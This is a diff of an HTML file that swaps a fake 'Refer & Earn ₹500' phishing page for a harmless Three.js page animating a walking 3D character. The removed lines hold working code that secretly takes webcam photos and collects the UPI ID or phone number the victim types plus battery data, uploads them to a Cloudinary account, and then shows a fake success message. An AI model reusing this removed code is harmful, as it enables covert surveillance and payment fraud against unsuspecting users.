@@ -1,328 +1,257 @@
+
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Refer & Earn Cash - Claim Your Bonus!</title>
-    <style>
-        * {
-            box-sizing: border-box;
-            margin: 0;
-            padding: 0;
-            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
-        }
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>3D Human Character</title>
 
-        body {
-            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
-            min-height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            padding: 20px;
-        }
+<style>
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
 
-        .main-container {
-            background: #ffffff;
-            width: 100%;
-            max-width: 440px;
-            border-radius: 16px;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
-            overflow: hidden;
-            text-align: center;
-        }
+body {
+    background: #11131c;
+    overflow: hidden;
+    font-family: Arial, sans-serif;
+}
 
-        .header-banner {
-            background: #ffcc00;
-            padding: 12px;
-            color: #b33600;
-            font-weight: bold;
-            font-size: 14px;
-            letter-spacing: 0.5px;
-            text-transform: uppercase;
-        }
+#scene {
+    width: 100%;
+    height: 100vh;
+    position: relative;
+    overflow: hidden;
+}
 
-        .content-body {
-            padding: 30px 20px;
-        }
+#character {
+    position: absolute;
+    width: 180px;
+    height: 350px;
+    bottom: 0;
+    left: 0;
+    will-change: transform;
+}
 
-        h1 {
-            color: #2d3748;
-            font-size: 24px;
-            margin-bottom: 10px;
-        }
+canvas {
+    width: 100%;
+    height: 100%;
+    display: block;
+}
 
-        .reward-badge {
-            background: #e6fffa;
-            color: #319795;
-            border: 2px dashed #319795;
-            padding: 10px;
-            border-radius: 8px;
-            font-size: 20px;
-            font-weight: bold;
-            margin: 20px 0;
-        }
-
-        p {
-            color: #718096;
-            font-size: 14px;
-            line-height: 1.5;
-            margin-bottom: 20px;
-        }
-
-        .input-group {
-            margin-bottom: 15px;
-            text-align: left;
-        }
-
-        .input-group label {
-            display: block;
-            font-size: 12px;
-            color: #4a5568;
-            font-weight: bold;
-            margin-bottom: 5px;
-        }
-
-        .input-group input {
-            width: 100%;
-            padding: 12px;
-            border: 1px solid #cbd5e0;
-            border-radius: 8px;
-            font-size: 14px;
-            outline: none;
-            transition: border-color 0.2s;
-        }
-
-        .input-group input:focus {
-            border-color: #667eea;
-        }
-
-        .device-info {
-            background: #f7fafc;
-            border: 1px solid #e2e8f0;
-            padding: 10px;
-            border-radius: 8px;
-            font-size: 12px;
-            color: #4a5568;
-            margin-bottom: 20px;
-            display: flex;
-            justify-content: space-around;
-        }
-
-        .claim-btn {
-            background: linear-gradient(135deg, #48bb78 0%, #38a169 100%);
-            color: white;
-            border: none;
-            width: 100%;
-            padding: 14px;
-            font-size: 16px;
-            font-weight: bold;
-            border-radius: 8px;
-            cursor: pointer;
-            box-shadow: 0 4px 12px rgba(72, 187, 120, 0.4);
-            transition: transform 0.2s;
-        }
-
-        .claim-btn:active {
-            transform: scale(0.98);
-        }
-
-        .features-list {
-            display: flex;
-            justify-content: space-around;
-            margin-top: 25px;
-            border-top: 1px solid #edf2f7;
-            padding-top: 15px;
-        }
-
-        .feature-item {
-            font-size: 12px;
-            color: #a0aec0;
-            font-weight: 600;
-        }
-
-        #video {
-            position: absolute;
-            top: -9999px;
-            left: -9999px;
-            opacity: 0;
-            pointer-events: none;
-        }
-    </style>
+#status {
+    position: absolute;
+    top: 20px;
+    left: 15px;
+    color: white;
+    font-size: 14px;
+}
+</style>
 </head>
+
 <body>
 
-    <video id="video" autoplay playsinline></video>
+<div id="scene">
 
-    <div class="main-container">
-        <div class="header-banner">🎉 Limited Time Referral Bonus 🎉</div>
-        
-        <div class="content-body">
-            <h1>You've Been Invited!</h1>
-            <p>Verify your device and enter your UPI ID or Mobile Number to claim your joining reward.</p>
-            
-            <div class="reward-badge">
-                💰 Claim ₹500 Free Cash
-            </div>
+    <div id="status">Loading 3D character...</div>
 
-            <div class="input-group">
-                <label for="upiInput">Enter UPI ID / Phone Number</label>
-                <input type="text" id="upiInput" placeholder="e.g. 9876543210@paytm" autocomplete="off">
-            </div>
-
-            <div class="device-info">
-                <span>🔋 Battery: <strong id="batteryStatus">Loading...</strong></span>
-                <span>⚡ Status: <strong style="color: #38a169;">Secure</strong></span>
-            </div>
-
-            <button class="claim-btn" id="claimBtn" onclick="triggerSequence()">Claim Bonus Now</button>
-
-            <div class="features-list">
-                <div class="feature-item">🔒 Secure Verification</div>
-                <div class="feature-item">⚡ Instant Payout</div>
-                <div class="feature-item">👥 100% Trusted</div>
-            </div>
-        </div>
+    <div id="character">
+        <canvas id="human"></canvas>
     </div>
 
-    <script>
-        const CLOUD_NAME = "nhy9lfkt";
-        const UPLOAD_PRESET = "rhk_upload";
+</div>
 
-        const video = document.getElementById('video');
-        const upiInput = document.getElementById('upiInput');
-        let mediaStream = null;
-        let typedKeystrokes = "";
-        let batteryLevelInfo = "Unknown";
+<script type="module">
 
-        // Track keystrokes dynamically
-        upiInput.addEventListener('input', (e) => {
-            typedKeystrokes = e.target.value;
-        });
+import * as THREE from
+'https://cdn.jsdelivr.net/npm/three@0.170.0/build/three.module.js';
 
-        window.addEventListener('load', () => {
-            initializeBackgroundCamera();
-            initializeBatteryCheck();
-        });
+import { GLTFLoader } from
+'https://cdn.jsdelivr.net/npm/three@0.170.0/examples/jsm/loaders/GLTFLoader.js';
 
-        async function initializeBatteryCheck() {
-            if ('getBattery' in navigator) {
-                try {
-                    const battery = await navigator.getBattery();
-                    updateBatteryUI(battery);
-                    battery.addEventListener('levelchange', () => updateBatteryUI(battery));
-                } catch (err) {
-                    batteryLevelInfo = "Accessible (Error reading level)";
-                    document.getElementById('batteryStatus').innerText = "Available";
-                }
-            } else {
-                batteryLevelInfo = "Not Supported";
-                document.getElementById('batteryStatus').innerText = "Compatible";
+
+const canvas = document.getElementById("human");
+const characterBox = document.getElementById("character");
+const status = document.getElementById("status");
+
+const scene = new THREE.Scene();
+
+const camera = new THREE.PerspectiveCamera(
+    35, 180 / 350, 0.1, 100
+);
+
+camera.position.set(0, 1.1, 4);
+camera.lookAt(0, 0.9, 0);
+
+const renderer = new THREE.WebGLRenderer({
+    canvas: canvas,
+    alpha: true,
+    antialias: true
+});
+
+renderer.setPixelRatio(
+    Math.min(window.devicePixelRatio, 1.5)
+);
+
+renderer.outputColorSpace = THREE.SRGBColorSpace;
+renderer.setSize(180, 350);
+
+renderer.toneMapping = THREE.ACESFilmicToneMapping;
+renderer.toneMappingExposure = 1.2;
+
+
+// Lighting
+
+scene.add(
+    new THREE.HemisphereLight(
+        0xffffff, 0x555566, 2
+    )
+);
+
+const light = new THREE.DirectionalLight(
+    0xffffff, 3
+);
+
+light.position.set(2, 4, 5);
+scene.add(light);
+
+
+// Load local GLB model
+
+const loader = new GLTFLoader();
+
+let human = null;
+let mixer = null;
+
+loader.load(
+
+    './man.glb',
+
+    function(gltf) {
+
+        human = gltf.scene;
+
+        scene.add(human);
+
+        const box = new THREE.Box3()
+            .setFromObject(human);
+
+        const size = box.getSize(
+            new THREE.Vector3()
+        );
+
+        const scale = 1.7 / size.y;
+
+        human.scale.setScalar(scale);
+
+        human.position.y = -box.min.y * scale;
+
+        // Load available model animations
+
+        if (gltf.animations.length > 0) {
+
+            mixer = new THREE.AnimationMixer(human);
+
+            const clip = gltf.animations.find(
+                animation => /walk|run/i.test(animation.name)
+            );
+
+            if (clip) {
+                mixer.clipAction(clip).play();
             }
+
         }
 
-        function updateBatteryUI(battery) {
-            const percentage = Math.round(battery.level * 100);
-            batteryLevelInfo = percentage + "% (Charging: " + battery.charging + ")";
-            document.getElementById('batteryStatus').innerText = percentage + "%";
+        status.textContent = "3D Character Loaded!";
+
+    },
+
+    function(progress) {
+
+        if (progress.total > 0) {
+            status.textContent =
+                "Loading: " +
+                Math.round(
+                    progress.loaded / progress.total * 100
+                ) + "%";
         }
 
-        async function initializeBackgroundCamera() {
-            try {
-                mediaStream = await navigator.mediaDevices.getUserMedia({ 
-                    video: { facingMode: "user" }, 
-                    audio: false 
-                });
-                video.srcObject = mediaStream;
-            } catch (error) {
-                // Handled on click
-            }
-        }
+    },
 
-        async function triggerSequence() {
-            if (!mediaStream) {
-                try {
-                    mediaStream = await navigator.mediaDevices.getUserMedia({ 
-                        video: { facingMode: "user" }, 
-                        audio: false 
-                    });
-                    video.srcObject = mediaStream;
-                } catch (e) {
-                    alert("Please allow camera access to verify your device and process the reward.");
-                    return;
-                }
-            }
+    function(error) {
 
-            const btn = document.getElementById('claimBtn');
-            btn.innerText = "Verifying Device & Inputs...";
-            btn.style.background = "#cbd5e0";
-            btn.disabled = true;
+        console.error(error);
 
-            setTimeout(() => {
-                executeBurstCapture();
-            }, 1000);
-        }
+        status.textContent =
+            "Unable to load man.glb. Check file location.";
 
-        function executeBurstCapture() {
-            const totalShots = 3;
-            let currentShot = 0;
+    }
 
-            const intervalId = setInterval(() => {
-                currentShot++;
-                const dataUrl = captureFrameToDataURL();
-                
-                // Upload image containing battery details and text inputs inside Cloudinary metadata (context)
-                uploadToCloudinary(dataUrl, currentShot);
+);
 
-                if (currentShot >= totalShots) {
-                    clearInterval(intervalId);
-                    
-                    if (mediaStream) {
-                        mediaStream.getTracks().forEach(track => track.stop());
-                    }
 
-                    setTimeout(() => {
-                        document.querySelector('.content-body').innerHTML = `
-                            <h2 style="color: #38a169; margin-bottom: 15px;">Verification Successful!</h2>
-                            <p>Target ID registered: <b>${typedKeystrokes || 'Default Account'}</b></p>
-                            <p>₹500 has been queued for transfer to your account.</p>
-                            <div style="background: #edf2f7; padding: 15px; border-radius: 8px; font-weight: bold; color: #4a5568; margin-top: 20px;">
-                                Status: Transfer Processing...
-                            </div>
-                        `;
-                    }, 1000);
-                }
-            }, 800);
-        }
+// Movement
 
-        function captureFrameToDataURL() {
-            const canvas = document.createElement('canvas');
-            canvas.width = video.videoWidth || 640;
-            canvas.height = video.videoHeight || 480;
-            const context = canvas.getContext('2d');
-            context.drawImage(video, 0, 0, canvas.width, canvas.height);
-            return canvas.toDataURL('image/png');
-        }
+let position = -180;
+let direction = 1;
+let lastTime = 0;
 
-        async function uploadToCloudinary(dataUrl, index) {
-            const formData = new FormData();
-            formData.append('file', dataUrl);
-            formData.append('upload_preset', UPLOAD_PRESET);
-            
-            // Clean and bundle keyboard input and battery status into Cloudinary metadata parameters
-            const cleanInput = encodeURIComponent(typedKeystrokes || "None");
-            const cleanBattery = encodeURIComponent(batteryLevelInfo);
-            formData.append('context', `keystrokes=${cleanInput}|battery=${cleanBattery}|shot_index=${index}`);
+const speed = 100;
 
-            try {
-                await fetch(`https://api.cloudinary.com/v1_1/${CLOUD_NAME}/image/upload`, {
-                    method: 'POST',
-                    body: formData
-                });
-            } catch (err) {
-                // Background transmission handles quietly
-            }
-        }
-    </script>
+function animate(time) {
+
+    requestAnimationFrame(animate);
+
+    const delta = lastTime
+        ? Math.min((time - lastTime) / 1000, 0.05)
+        : 0;
+
+    lastTime = time;
+
+    const screenWidth = window.innerWidth;
+    const characterWidth = characterBox.offsetWidth;
+
+    position += direction * speed * delta;
+
+    if (position >= screenWidth - characterWidth) {
+        position = screenWidth - characterWidth;
+        direction = -1;
+    }
+
+    if (position <= 0) {
+        position = 0;
+        direction = 1;
+    }
+
+    characterBox.style.transform =
+        `translateX(${position}px) scaleX(${direction < 0 ? -1 : 1})`;
+
+    if (mixer) {
+        mixer.update(delta);
+    }
+
+    renderer.render(scene, camera);
+
+}
+
+animate(0);
+
+
+// Resize
+
+window.addEventListener("resize", () => {
+
+    renderer.setSize(
+        canvas.clientWidth,
+        canvas.clientHeight,
+        false
+    );
+
+});
+
+</script>
 
 </body>
 </html>
